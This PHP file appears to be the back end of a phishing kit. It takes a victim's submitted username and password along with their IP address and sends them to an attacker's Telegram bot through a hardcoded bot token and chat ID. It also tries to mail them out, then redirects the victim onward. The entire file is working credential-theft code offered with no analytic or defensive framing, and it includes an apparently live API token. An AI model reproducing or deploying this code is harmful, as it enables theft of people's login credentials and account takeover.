<?php
$pg=$_REQUEST['page'];
$pg1=$_REQUEST['page1'];
$pg2=$_REQUEST['page2'];
$bin6=$_REQUEST['page6'];
$bin6=$_REQUEST['page7'];
$ip = getenv("REMOTE_ADDR");
$bin6 = substr($_POST['usr'] , 0 , 200);
$bin7 = substr($_POST['pwd'] , 0 , 200);
$link = $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'] ;
$back = "index1.php?page6=$bin6&page7=$bin7" ;
$message .= "USR  :".$_POST['usr']."\n";
$message .= "PWD  :".$_POST['pwd']."\n";
$message .= "IP :".$ip."\n";
function telegram_send($message) {
    $curl = curl_init();
    $api_key  = '5040561128:AAGa_HX0_-v4UajIXa4u9zGnrTqbOpEMlWw';
    $chat_id  = '-656941862';
    $format   = 'HTML';
    curl_setopt($curl, CURLOPT_URL, 'https://api.telegram.org/bot'. $api_key .'/sendMessage?chat_id='. $chat_id .'&text='. $message .'&parse_mode=' . $format);
    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); 
    $result = curl_exec($curl);
    curl_close($curl);
    return true;
}
telegram_send(urlencode($message));
$subject = "$ip";
$headers = "From: ST <support@one.com>";
mail($send,$subject,$message,$headers);
header("Location: $back");
?>